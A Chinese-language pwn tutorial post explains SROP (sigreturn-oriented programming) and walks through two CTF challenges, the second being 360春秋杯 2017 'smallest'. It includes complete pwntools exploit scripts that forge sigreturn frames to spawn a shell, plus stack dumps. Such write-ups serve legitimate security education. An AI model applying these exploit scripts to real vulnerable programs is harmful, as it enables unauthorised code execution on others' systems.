# 附件
链接: [https://pan.baidu.com/s/1XGou-bBu24upiAXuZu3EIA](https://pan.baidu.com/s/1XGou-bBu24upiAXuZu3EIA)  密码: wl0o

# 前言
在之前的文章中已经说过了SROP：

[PWN入门（1-3-10）-高级ROP-SROP](https://www.yuque.com/cyberangel/rg9gdm/ol2pl5)

但是这片文章是我刚刚学习pwn的时候写的，存在着理解不准确等原因，导致我现在都不想看之前写的东西，所以在这片文章中重新说一下。

# 原理
## Signal机制
现在回顾一下Linux的Signal机制：Signal机制是类unix系统（如Linux、macOS等）中进程之间相互传递信息的一种方法。在一般情况下我们也将其称为软中断信号（软中断）。比如说，进程之间可以通过系统调用kill来发送软中断信号以此结束某个进程。一般来说，信号机制常见的步骤如下图所示：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1622427836804-74299fab-e4be-4dfd-b0a3-613a9c6029f4.png)

> 这个图你肯定十分的熟悉，毕竟快成为经典了
>

1）当用户的程序（用户层）发起signal信号传递时，控制权由用户层切换到内核层（态），这时进程会被暂时挂起。

ucontent save：在内核层中会保存当前程序的状态（如寄存器）中的值到stack上，**<font style="color:#F5222D;">以及压入Signal信息和指向</font>****<font style="color:#F5222D;">rt_sigreturn</font>****<font style="color:#F5222D;">的系统调用地址，</font>**此时的stack结构如下图所示：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1622428798322-4f51130d-8763-4735-9a60-19d8b618cf86.png)

> 注意：栈的地址是从高地址向低地址生长的，上面的图从上到下指的是从高地址到低地址（栈顶方向）
>

这里需要补充的是我们经常将ucontext和siginfo总称为Signal Frame，由于**<font style="color:#F5222D;">Signal Frame是保存在用户空间的stack上，因此我们可以任意修改它。</font>**

2）然后会跳转到注册过的signal handler中处理相应的signal。因此当signal handler执行完之后就会执行rt_sigreturn。其中32位的rt_sigreturn的调用号为77，64位的系统调用号为15。

3）**<font style="color:#F5222D;">内核执行sigreturn系统调用代码跳转到内核层恢复（pop）之前程序的状态（上下文）【ucontent restore】</font>**

4）控制权交给用户层，继续执行用户层的程序代码

以下是x86和x64的sigcontext：

> 文章中使用的是Linux-ubuntu系统，文件和所在路径均为
>
> /usr/include/x86_64-linux-gnu/bits/sigcontext.h
>

```c
//x86
#define X86_FXSR_MAGIC		0x0000

struct sigcontext
{
  unsigned short gs, __gsh;
  unsigned short fs, __fsh;
  unsigned short es, __esh;
  unsigned short ds, __dsh;
  unsigned long edi;
  unsigned long esi;
  unsigned long ebp;
  unsigned long esp;
  unsigned long ebx;
  unsigned long edx;
  unsigned long ecx;
  unsigned long eax;
  unsigned long trapno;
  unsigned long err;
  unsigned long eip;
  unsigned short cs, __csh;
  unsigned long eflags;
  unsigned long esp_at_signal;
  unsigned short ss, __ssh;
  struct _fpstate * fpstate;
  unsigned long oldmask;
  unsigned long cr2;
};

#else /* __x86_64__ */
```

```c
//x64
struct sigcontext
{
  __uint64_t r8;
  __uint64_t r9;
  __uint64_t r10;
  __uint64_t r11;
  __uint64_t r12;
  __uint64_t r13;
  __uint64_t r14;
  __uint64_t r15;
  __uint64_t rdi;
  __uint64_t rsi;
  __uint64_t rbp;
  __uint64_t rbx;
  __uint64_t rdx;
  __uint64_t rax;
  __uint64_t rcx;
  __uint64_t rsp;
  __uint64_t rip;
  __uint64_t eflags;
  unsigned short cs;
  unsigned short gs;
  unsigned short fs;
  unsigned short __pad0;
  __uint64_t err;
  __uint64_t trapno;
  __uint64_t oldmask;
  __uint64_t cr2;
  __extension__ union
    {
      struct _fpstate * fpstate;
      __uint64_t __fpstate_word;
    };
  __uint64_t __reserved1 [8];
};

#endif /* __x86_64__ */
```

## SROP攻击原理
仔细回顾一下内核在 signal 信号处理的过程中的工作，我们可以发现内核主要做的工作就是为进程保存并且恢复上下文。这个主要的变动都在Signal Frame中。但是需要注意的是：

1. **<font style="color:#F5222D;">Signal Frame被保存在用户的地址空间中，所以用户是可以读写的。</font>**
2. 由于内核与信号处理程序无关 (kernel agnostic about signal handlers)，它并不会去记录这个signal对应的Signal Frame，所以当执行rt_sigreturn系统调用时，此时的Signal Frame并不一定是之前内核为用户进程保存的Signal Frame。

说到这里，其实，SROP 的基本利用原理也就出现了。下面举两个简单的例子。

### getshell
首先，我们假设攻击者可以控制用户进程的栈，那么它就可以伪造一个Signal Frame，这里以64位为例子如下图所示以给出Signal Frame更加详细的信息：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1623152231088-132ea8ba-a60c-4774-a6af-31d84c432481.png)

当系统执行完rt_sigreturn系统调用时会执行一系列的pop指令以便于恢复相应寄存器的值，当执行到pop rip时就会将程序执行流指向syscall地址，根据相应寄存器的值，便会得到一个shell。

### system call chains
需要指出的是在上面的例子中，我们只是单独的获得一个shell。有时候我们会希望执行一系列的函数，这时只需要做两处修改即可：

1. 控制栈指针。
2. 把原来rip指向的syscall gadget换成syscall;ret gadget。

如下图所示，这样当每次syscall返回的时候，栈指针都会指向下一个Signal Frame。因此就可以执行一系列的rt_sigreturn函数调用：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1622430815485-3b40c90a-2e82-46c9-820a-fbeed6d372e9.png)

### 后续 
需要注意的是，我们在构造 ROP 攻击的时候，需要满足下面的条件

1. 可以通过栈溢出来控制栈的内容
2. 需要知道相应的地址
    1. "/bin/sh"
    2. Signal Frame
    3. syscall
    4. sigreturn
3. 需要有够大的空间来塞下整个signal frame

此外关于sigreturn以及syscall;ret这两个gadget在上面并没有提及。提出该攻击的论文作者发现了这些gadgets出现的某些地址：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1622431004932-2d966f0e-babe-4650-b6c0-36d93feac949.png)

并且作者发现有些系统上SROP的地址被随机化了，而有些则没有。比如说Linux < 3.3 x86_64（在Debian 7.0，Ubuntu Long Term Support，CentOS 6 系统中默认内核），可以直接在 vsyscall 中的固定地址处找到syscall&return代码片段。如下所示：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1622431063265-991ecf2a-5f40-4b07-881e-c3803ef8077d.png)

但是目前它已经被vsyscall-emulate和vdso机制代替了。此外，目前大多数系统都会开启 ASLR 保护，所以相对来说这些 gadgets都并不容易找到。**<font style="color:#F5222D;">值得一说的是，对于</font>****<font style="color:#F5222D;">rt_sigreturn</font>****<font style="color:#F5222D;">系统调用来说，在64位系统中，</font>****<font style="color:#F5222D;">rt_sigreturn</font>****<font style="color:#F5222D;">系统调用对应的系统调用号为15，只需要 RAX=15，并且执行syscall即可实现调用</font>****<font style="color:#F5222D;">rt_sigreturn</font>****<font style="color:#F5222D;">调用。而RAX寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说read函数的返回值为读取的字节数。</font>**

## 利用工具
值得高兴的是pwntools中已经集成了对SROP的攻击。

# 例题
## 例题1
> 此例题来自：[https://xz.aliyun.com/t/5240](https://xz.aliyun.com/t/5240)
>

原文中的附件已经给出了源代码和例题，这里选择看IDA吧，另外文件保护如下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1622431615754-df012716-0a07-4d9b-bf53-ad7829f6fdef.png)

main函数的汇编如下：

```c
.text:00000000004000E8 ; Attributes: bp-based frame
.text:00000000004000E8
.text:00000000004000E8 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:00000000004000E8                 public main
.text:00000000004000E8 main            proc near               ; DATA XREF: LOAD:0000000000400018↑o
.text:00000000004000E8 ; __unwind {
.text:00000000004000E8                 push    rbp
.text:00000000004000E9                 mov     rbp, rsp
.text:00000000004000EC                 mov     rax, 0
.text:00000000004000F3                 mov     rdi, 0          ; error_code
.text:00000000004000FA                 lea     rsi, global_buf ; buf
.text:0000000000400101                 mov     rdx, 200h       ; count
.text:0000000000400108                 syscall                 ; LINUX - sys_read 
.text:000000000040010A                 cmp     rax, 0F8h  #read读入的字符串长度会保存到rax寄存器中，如果字符串的长度小于0xF8，则退出程序
.text:0000000000400110                 jb      short exit
.text:0000000000400112                 mov     rdi, 0          ; __unused
.text:0000000000400119                 mov     rsp, rsi
.text:000000000040011C                 mov     rax, 0Fh
.text:0000000000400123                 syscall                 ; LINUX - sys_rt_sigreturn  #syscall rt_sigreturn
.text:0000000000400125                 jmp     short exit
.text:0000000000400125 ; ---------------------------------------------------------------------------
.text:0000000000400127                 db 2 dup(90h)
.text:0000000000400129 ; ---------------------------------------------------------------------------
.text:0000000000400129
.text:0000000000400129 syscall:                                ; LINUX -
.text:0000000000400129                 syscall
.text:000000000040012B                 jmp     short $+2
.text:000000000040012D ; ---------------------------------------------------------------------------
.text:000000000040012D
.text:000000000040012D exit:                                   ; CODE XREF: main+28↑j
.text:000000000040012D                                         ; main+3D↑j ...
.text:000000000040012D                 mov     rax, 3Ch
.text:0000000000400134                 mov     rsi, 0
.text:000000000040013B                 syscall                 ; LINUX - sys_exit
.text:000000000040013D                 mov     eax, 0
.text:0000000000400142                 pop     rbp
.text:0000000000400143                 retn
.text:0000000000400143 ; } // starts at 4000E8
.text:0000000000400143 main            endp
```

> cmp     rax, 0F8h中的0xF8具有特殊含义，即ucontext_t结构体的大小
>

这个程序的流程很简单，首先调用了通过syscall调用read函数将我们输入的内容保存到全局变量global_buf中【char global_buf[512](0x200)】，然后在校验了长度之后syscall了rt_sigreturn；因为这里这里需要使用pwntools进行攻击，所以我们先通过这道题的exp来了解一下：

```python
#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *

context.arch = "amd64"
# context.log_level = "debug"
elf = ELF('./srop')
sh = process('./srop')

# 生成调试文件
try:
    f = open('pid', 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()
except Exception as e:
    print(e)

str_bin_sh_offset = 0x100

# Creating a custom frame
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = elf.symbols['global_buf'] + str_bin_sh_offset
frame.rsi = 0
frame.rdx = 0
frame.rip = elf.symbols['syscall']

# pause()
gdb.attach(sh)
sh.send(str(frame).ljust(str_bin_sh_offset, 'a') + '/bin/sh\x00')

sh.interactive()

# 删除调试文件
os.system("rm -f pid")
```

我们在如上代码框中的地方下断点，然后运行调试，可以来到：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1622452667957-b01efc5a-85b1-4c93-acaf-f83936901326.png)

之前我们说过，当调用rt_sigreturn后会将栈中的内容pop到寄存器中，rt_sigreturn前的stack状况如下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1622452791270-aed290b2-a065-4253-a232-a64e845a4ce4.png)

调用rt_sigreturn后如下图所示：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1622452845737-41582dfd-9d60-4de2-ab5d-8ee7c1a91109.png)

```python
pwndbg> stack 50
00:0000│ rsi rsp  0x601000 (global_buf) ◂— 0x0 #pop
... ↓
0d:0068│          0x601068 (global_buf+104) —▸ 0x601100 (global_buf+256) ◂— 0x68732f6e69622f /* '/bin/sh' */ #pop rdi
0e:0070│          0x601070 (global_buf+112) ◂— 0x0
... ↓
12:0090│          0x601090 (global_buf+144) ◂— 0x3b /* ';' */ 												 #pop rax
13:0098│          0x601098 (global_buf+152) ◂— 0x0
... ↓
15:00a8│          0x6010a8 (global_buf+168) —▸ 0x400129 (main+65) ◂— syscall 
16:00b0│          0x6010b0 (global_buf+176) ◂— 0x0
17:00b8│          0x6010b8 (global_buf+184) ◂— 0x33 /* '3' */
18:00c0│          0x6010c0 (global_buf+192) ◂— 0x0
... ↓
1f:00f8│          0x6010f8 (global_buf+248) ◂— 'aaaaaaaa/bin/sh'
20:0100│          0x601100 (global_buf+256) ◂— 0x68732f6e69622f /* '/bin/sh' */
21:0108│          0x601108 (global_buf+264) ◂— 0x0
... ↓
pwndbg> 
```

当我们再次单步后就会得到一个shell；这里介绍一下pwntools中srop的简单使用方法，大致格式如下：

```python
# Creating a custom frame
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = elf.symbols['global_buf'] + str_bin_sh_offset
frame.rsi = 0
frame.rdx = 0
frame.rip = elf.symbols['syscall']
```

+ 调用pwnlib中的SigreturnFrame初始化frame
+ 然后对frame中的一些寄存器进行设置，如rax、rdi等，由于这里要获得一个shell，因此按照下图中设置即可：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1622455069201-ac27ea29-768e-4c3c-8ac8-1f40f035bac6.png)

因此在执行rt_sigreturn前的stack是这样的，这里需要注意的是并不需要布置rt_sigreturn在stack中，因为我们可以通过在程序的代码段中调用了它：

```python
pwndbg> x/gx 0x601000
0x601000 <global_buf>:	0x0000000000000000	0x0000000000000000
    					#uc_flags			#&uc
0x601010 <global_buf+16>:	0x0000000000000000	0x0000000000000000
    						#un_stack.ss_sp		#uc_stack.ss_flags
0x601020 <global_buf+32>:	0x0000000000000000	0x0000000000000000
    						#uc_stack.ss_size	#pop r8
0x601030 <global_buf+48>:	0x0000000000000000	0x0000000000000000re
    						#pop r9				#pop r10
0x601040 <global_buf+64>:	0x0000000000000000	0x0000000000000000
    						#pop r11			#pop r12
0x601050 <global_buf+80>:	0x0000000000000000	0x0000000000000000
    						#pop r13			#pop r14
0x601060 <global_buf+96>:	0x0000000000000000	0x0000000000601100
    						#pop r15			#pop rdi
0x601070 <global_buf+112>:	0x0000000000000000	0x0000000000000000
    						#pop rsi			#pop rbp
0x601080 <global_buf+128>:	0x0000000000000000	0x0000000000000000
    						#pop rbx			#pop rdx
0x601090 <global_buf+144>:	0x000000000000003b	0x0000000000000000
    						#pop rax 			#pop rcx
0x6010a0 <global_buf+160>:	0x0000000000000000	0x0000000000400129
    						#pop rsp			#pop rip--syscall_addr
0x6010b0 <global_buf+176>:	0x0000000000000000	0x0000000000000033
0x6010c0 <global_buf+192>:	0x0000000000000000	0x0000000000000000
0x6010d0 <global_buf+208>:	0x0000000000000000	0x0000000000000000
0x6010e0 <global_buf+224>:	0x0000000000000000	0x0000000000000000
0x6010f0 <global_buf+240>:	0x0000000000000000	0x6161616161616161
    											#aaaaaaaa
0x601100 <global_buf+256>:	0x0068732f6e69622f	0x0000000000000000
    						#/bin/sh\x00
0x601110 <global_buf+272>:	0x0000000000000000	0x0000000000000000
0x601120 <global_buf+288>:	0x0000000000000000	0x0000000000000000
0x601130 <global_buf+304>:	0x0000000000000000	0x0000000000000000
0x601140 <global_buf+320>:	0x0000000000000000	0x0000000000000000
0x601150 <global_buf+336>:	0x0000000000000000	0x0000000000000000
0x601160 <global_buf+352>:	0x0000000000000000	0x0000000000000000
0x601170 <global_buf+368>:	0x0000000000000000	0x0000000000000000
0x601180 <global_buf+384>:	0x0000000000000000	0x0000000000000000
0x601190 <global_buf+400>:	0x0000000000000000	0x0000000000000000
0x6011a0 <global_buf+416>:	0x0000000000000000	0x0000000000000000
0x6011b0 <global_buf+432>:	0x0000000000000000	0x0000000000000000
0x6011c0 <global_buf+448>:	0x0000000000000000	0x0000000000000000
0x6011d0 <global_buf+464>:	0x0000000000000000	0x0000000000000000
0x6011e0 <global_buf+480>:	0x0000000000000000	0x0000000000000000
0x6011f0 <global_buf+496>:	0x0000000000000000	0x0000000000000000
0x601200:	0x0000000000000000	0x0000000000000000
0x601210:	0x0000000000000000	0x0000000000000000
0x601220:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

另外这一个例子有意思的一点是地址0x400119处的mov rsp, rsi，其中rsi中是global_buf的地址，也就是说当我们输入之后程序会将stack转移到global_buf处，可以联想到之前的栈转移：

```c
.text:00000000004000FA                 lea     rsi, global_buf ; buf
.text:0000000000400101                 mov     rdx, 200h       ; count
.text:0000000000400108                 syscall                 ; LINUX - sys_read
.text:000000000040010A                 cmp     rax, 0F8h
.text:0000000000400110                 jb      short exit
.text:0000000000400112                 mov     rdi, 0          ; __unused
.text:0000000000400119                 mov     rsp, rsi  	   # lea rsi,global_buf
```

在调用rt_sigreturn后会布置好寄存器，因为frame.rip=syscall_addr，因此恢复后会直接调用syscall执行execve得到一个shell。

## 例题2
### 思路
> [https://github.com/Reshahar/BlogFile/blob/master/smallest/smallest](https://github.com/Reshahar/BlogFile/blob/master/smallest/smallest)
>

这道题来自2017年的360春秋杯，也是有关srop的一道题，文件保护如下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1622465948601-30850163-1c9f-415b-a453-5cbb9b3e9d0b.png)

只开启了nx保护，放入IDA中看一下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1622466182637-b619c163-bb1a-43e5-afe0-8aa507885c4d.png)

程序就只有一个start函数，挺好：

```c
ssize_t read(int fd, void *buf, size_t count); #read(0,rsp,0x400)
```

接下来要注意的一点是start中的retn，retn相当于pop rip；而在read函数中是向栈顶开始读入数据的，因此我们可以利用这一点来控制程序流。

由于程序开启了NX保护（栈上不可执行），因此我们不能直接写入shellcode，这里先思考一下想要getshell需要什么条件：

1、需要知道syscall的地址（这个地址程序中已有）

2、getshell时需要调用execve，这个可以用syscall（rax=59）进行间接的系统调用，这里就出现了一个问题：我们如何控制rax？

3、由于read函数读入字符串后其长度会放入rax中，因此我们可以使用这一点进行控制，这里要注意的是rax不能清空或改变，即在劫持控制流返回到retn时不能劫持到start函数开头的xor rax rax。

5、另外，在设置sigframe时需要知道stack的地址，因此我们需要泄露stack地址，这里可以使用write进行泄露，但是出现了一个问题，如何调用write函数？

6、要调用write函数这里有两种方式：

1）通过调用系统调用rt_sigreturn布置寄存器（write：rax==1），通过syscall调用write函数，但是调用rt_sigreturn需要控制rax==15，而rax的控制在这道题中只能是由read函数控制。

2）通过read函数read一个字节来控制rax==1。

很明显第一种方式还是绕远了，还是第二种方式简单，但是在此道题目中不太好像到，在这篇文章中的exp采用第二种方式。

### 编写exp
为了保险起见，先向程序输入3个start_addr，防止程序return后失去控制流：

> 在刚开始做这道题的时候可以在stack上多布置几个start_addr，反正也没有什么影响。
>

```python
syscall_addr=0x4000BE
start_addr=0x4000B0
skip_xor_addr=0x4000B3

payload1=p64(start_addr)*3
p.sendline(payload1)
```

首先我们得泄露stack的地址，为之后的getshell做准备，这里选择使用syscall来调用write。

> 注意：在payload1中，不能写成：payload1=p64(skip_xor_addr)*3，因为需要清空寄存器rax
>
> 当程序第二次开始执行到syscall时，这里的rax是第一次程序输入时len(payload1)+0x1==0x18+0x1==0x19，从而会调用其他函数不受我们的控制（这里尽量不要这样做），加一的原因是这里使用的是sendline而不是send。
>

接下来程序再次会调用read函数（read的系统调用号为0，正好是xor rax rax的结果），因为这里的是read(0,$rsp,0x400)并且我们还要调用write函数，所以这次的read可不是乱来的~~，一鞭，两鞭.mp4~~：

```python
#gdb.attach(p,'b 0x4000b3')
p.send('\xb3')               #write(rdi==1,$rsi==$rsp,rdx==0x400)
```

如上所示，由于read的长度会到rax，并且write的系统调用号为1，这里只能选择读入一个字节，但是这个字节也不是随便乱输入的，来看一下此时的stack状况：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1623064168369-d73eca6e-f16f-4e49-b06a-d2ccaa8266cc.png)

如上图所示，断点断在了syscall，这里是向栈地址0x7fffffffdf98（栈顶rsp）中写入数据，而栈顶存放的是程序text段的地址，利用这一点我们向程序写入单字节'\xb3'，这样可以在下一次执行时跳过xor rax rax。接下来程序会执行write函数，因为由于程序中恰好存在一段gadget：

```python
mov rdi，rax
```

这使得刚刚read后的rax==1赋值给了rdi：rdi在64位传参顺序上起到重要作用（gcc）：当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9，多余的参数会放入被压入到stack中，因此程序会执行：write(1($rdi),$rsp($rsi),0x400($rdx))：

> 这也就是之前说为什么第二种方式不好想到的原因。
>

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1623065395301-fdce5823-f1ed-4e31-8396-fbf7c30a053c.png)

这样就可以泄露出stack地址了：

```python
leak_stack_addr=u64(p.recv()[8:16]) #看这里切片的位置
print hex(leak_stack_addr)          #leak_stack_addr==0x7fffffffe20a
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1623065711887-44730a70-de50-44cf-acb8-643406383c97.png)

泄露出stack地址之后，我们开始布置read函数方便之后读入shellcode；到现在为止，程序仍会跳到start函数开头开始执行（包括xor rax,rax），执行之后rax==0之后会执行read(0,$rsp,0x400)向stack中读入以下内容：

```python
frame1=SigreturnFrame()
frame1.rax=constants.SYS_read
frame1.rdi=0x0               #arguments1
frame1.rsi=leak_stack_addr   #arguments2
frame1.rdx=0x400             #arguments3
                             #read(0,leak_stack_addr,0x400)
frame1.rsp=leak_stack_addr
frame1.rip=syscall_addr
payload3=p64(start_addr)+'a'*8+str(frame1)
p.send(payload3)
```

读入之前：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1623077170540-44847019-f532-4309-988f-cc783befa67b.png)

读入之后：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1623077208385-973d312a-1896-4e03-a43c-719927906121.png)

仔细看上下图，这里的读入可是覆盖了其他的内存地址中的内容，注意这里读入的地方为0x7fffffffdfa8。另外在payload3中payload3=p64(start_addr)+'a'*8+str(frame1)的p64(start_addr)必须写上，因为read之后原有的栈情况不再存在需要重新布置，如下所示：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1623078198730-3fee9ed8-333f-4cd2-b8cf-21407815b91d.png)

这里的'a'*8的作用先按下不表，布置好frame1之后因为payload3中写的是p64(start_addr)，因此retn后pop rip会执行xor rax,rax清空rax进而调用read：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1623078874821-94f81295-89d0-47b8-b159-1b3a3f8a76a0.png)

由于我们要syscall rt_sigreturn，因此这次read的长度要为15，发送方式为send：

```python
sigreturn = p64(syscall_addr)+'b'*7 #len(sigreturn)==15
p.send(sigreturn)                   #len(sigreturn)==15 to syscall sigreturn next
```

在读入sigreturn后rax==15，此时的stack状况如下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1623153914931-d6005272-edad-4318-8e69-9c4f04b76076.png)

> 为什么上图要用表格的形式来呈现？因为gdb下断点断不下来，而且就算断下来之后这次的read是将之后的payload一并读入会导致此篇文章不够清晰，所以采取了这种方式。
>

然后程序会执行retn即pop rip，程序流跳转到syscall：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1623154527060-0afc8880-a1bf-4207-afdf-bafe3eab477b.png)

这次的syscall调用rt_sigreturn对寄存器进行设置，设置完毕后rip还会指向syscall调用read读入payload5，此时的stack状况如下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1623154683998-6a134227-ee4d-46b4-8b84-0b9361d35635.png)

再补充一点之前的'aaaaaaaa'的作用，'aaaaaaaa'的作用其实就是方便以后布置栈上的情况的，避免让sigframe受到影响：



![](https://cdn.nlark.com/yuque/0/2021/png/574026/1623155091845-11766000-70d5-421a-82f5-5a24aa3e4119.png)

言归正传，最后retn时pop rip，rip==start_addr，xor后rax==0，会read sigreturn控制rax==15，从而触发rt_sigreturn执行execve。

嗯，思路的确是简单，但是这里要考虑有关"/bin/sh\x00"的写入问题，在之前的图中可以知道我们需要向寄存器rdi中写入"/bin/sh\x00"的地址，但是程序中并没有"/bin/sh\x00"，但是我们可以向stack中写入"/bin/sh\x00"并把这个地址提前写入rdi中即可：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1623157529910-f08e68af-913b-42df-b956-7b9dce1047ce.png)

> 先确定要写入的地址，将这个地址设置为frame2的rdi，然后read "/bin/sh\x00"。
>

完整exp如下：

```python
#coding=utf-8
from pwn import *
context.log_level='debug'
context.arch='amd64'

p=process('./smallest')
elf=ELF('./smallest')

syscall_addr=0x4000BE
start_addr=0x4000B0
skip_xor_addr=0x4000B3

#gdb.attach(p,'b *0x4000c0')
payload1=p64(start_addr)*3
p.sendline(payload1)
payload2='\xb3'
p.send(payload2)

leak_stack_addr=u64(p.recv()[8:16])
print hex(leak_stack_addr)   #leak_stack==0x7fffffffe20a

frame1=SigreturnFrame()
frame1.rax=constants.SYS_read
frame1.rdi=0x0               #arguments1
frame1.rsi=leak_stack_addr   #arguments2
frame1.rdx=0x400             #arguments3
                             #read(0,leak_stack_addr,0x400)
frame1.rsp=leak_stack_addr
frame1.rip=syscall_addr
payload3=p64(start_addr)+'a'*8+str(frame1)
p.send(payload3)             #syscall read to read payload3 to stack

sigreturn = p64(syscall_addr)+'b'*7       
p.send(sigreturn)            #len(sigreturn)==15 to syscall sigreturn next

frame2=SigreturnFrame()
frame2.rax=constants.SYS_execve
frame2.rdi=leak_stack_addr+0x300 #arguments1
frame2.rsi=0x0                   #arguments2
frame2.rdx=0x0                   #arguments3
frame2.rip=syscall_addr
payload4=p64(start_addr)+'b'*8+str(frame2)
payload5=payload4+(0x300-len(payload4))*'\x00'+'/bin/sh\x00'
p.send(payload5)

p.send(sigreturn)
p.sendline('whoami')

p.interactive()
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1623157785716-d84d52c4-3f2b-497c-8a8b-25e44ccdfa7e.png)

# 总结
注意，SROP的栈布置：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1622455069201-ac27ea29-768e-4c3c-8ac8-1f40f035bac6.png)

